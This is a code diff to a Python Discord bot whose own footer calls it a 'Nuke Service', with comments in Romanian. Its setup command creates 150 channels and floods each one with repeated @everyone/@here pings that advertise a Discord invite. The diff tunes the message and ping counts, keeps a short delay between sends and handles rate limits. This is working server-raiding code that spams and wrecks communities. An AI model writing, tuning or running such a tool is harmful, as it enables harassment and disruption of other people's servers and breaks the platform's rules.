@@ -318,9 +318,6 @@ async def setup(ctx):
     embed_content.set_image(url="https://i.imgur.com/yMQvcRw.gif")
     embed_content.set_footer(text="Larp Empire • Nuke Service")
 
-    # ===== MESAJUL FINAL (repetat de 36 de ori) =====
-    final_message = ("@everyone @here join https://discord.gg/larpempire\n") * 36
-
     # ===== CREARE 150 CANALE =====
     total_channels = 150
     font_styles = ["bold", "script", "double"]
@@ -351,20 +348,20 @@ async def setup(ctx):
                 pass
 
     async def send_remaining_messages(channel):
-        """Trimite mesaje cu ping-uri crescătoare, de un număr random de ori (20-41)"""
+        """Trimite mesaje cu ping-uri crescătoare, de un număr random de ori (15-31)"""
         try:
-            # Număr random de mesaje trimise pe acest canal (între 20 și 41)
-            message_count = random.randint(20, 41)
+            # Număr random de mesaje trimise pe acest canal (între 15 și 31)
+            message_count = random.randint(15, 31)
 
             for i in range(message_count):
-                # Alege un număr random de ping-uri între 5 și 9
-                ping_count = random.randint(5, 9)
+                # Alege un număr random de ping-uri între 3 și 6
+                ping_count = random.randint(3, 6)
                 ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 await channel.send(content=ping_message)
-                await asyncio.sleep(0.15)  # pauză mică între mesaje
+                await asyncio.sleep(0.15)
 
-            # După terminarea mesajelor, trimite mesajul final (36 de linii)
-            await channel.send(content=final_message)
+            # După terminarea mesajelor, trimite embed-ul ca ultim mesaj
+            await channel.send(embed=embed_content)
 
         except discord.HTTPException as e:
             if e.status == 429:  # Rate limit
